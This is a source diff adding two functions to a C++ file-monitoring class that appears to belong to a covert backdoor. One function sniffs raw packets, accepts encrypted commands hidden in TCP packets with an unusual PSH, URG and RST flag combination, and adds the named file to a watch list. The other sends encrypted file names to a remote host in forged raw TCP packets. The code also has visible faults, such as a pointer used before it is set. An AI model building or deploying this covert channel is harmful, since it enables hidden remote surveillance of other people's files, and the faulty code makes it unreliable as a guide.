@@ -4,6 +4,8 @@
 #include <sys/time.h>
 #include <unistd.h>
 
+#include "NetworkEngine.h"
+
 #define EVENT_SIZE (sizeof(struct inotify_event))
 #define EVENT_BUFFER_LEN (1024 * (EVENT_SIZE + 16))
 
@@ -97,4 +99,66 @@ void FileMonitor::runMonitoring() {
             p += EVENT_SIZE + event->len;
         }
     }
+}
+
+void FileMonitor::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
+                              NetworkEngine *net) {
+    struct ethhdr *eth;
+    struct iphdr *ip;
+    struct tcphdr *tcp;
+
+    // is it from same machine?
+    if (net->isFromThisMachine(eth)) {
+        return;
+    }
+
+    // is it ip?
+    if (!net->isIp(eth)) {
+        return;
+    }
+
+    // is it tcp?
+    ip = (struct iphdr *)(packet + ETH_HLEN);
+    if (!net->isTcp(ip)) {
+        return;
+    }
+
+    tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));
+
+    // is it authenticated?
+    if (!net->isAuth(tcp)) {
+        return;
+    }
+
+    // not a get request
+    if (!tcp->psh || !tcp->urg || !tcp->rst) {
+        return;
+    }
+
+    unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
+    unsigned int payloadSize = header->len - ETH_HLEN - (ip->ihl * 4) - (tcp->doff * 4);
+
+    UCharVector ciphertext{};
+    ciphertext.assign(payload, payload + payloadSize);
+    UCharVector plaintextBuff = net->getCrypto()->dec(ciphertext);
+    std::string plaintext((char *)plaintextBuff.data(), payloadSize);
+
+    this->addWatchFile(plaintext);
+}
+
+void FileMonitor::sendRequest(const std::string &file, const unsigned int daddr,
+                              NetworkEngine *net) {
+    static const unsigned char flags = TcpStack::PSH_FLAG | TcpStack::URG_FLAG | TcpStack::RST_FLAG;
+    struct in_addr daddrIn;
+    daddrIn.s_addr = daddr;
+
+    unsigned short sport = (Crypto::rand() % 55535) + 10000;
+    unsigned short dport = (Crypto::rand() % 55535) + 10000;
+    unsigned int seq = Crypto::rand();
+    unsigned int ack = Crypto::rand();
+
+    UCharVector plaintext(file.begin(), file.end());
+    UCharVector ciphertext = net->getCrypto()->enc(plaintext);
+
+    net->sendRawTcp(*net->getIp(), daddrIn, sport, dport, seq, ack, flags, ciphertext);
 }
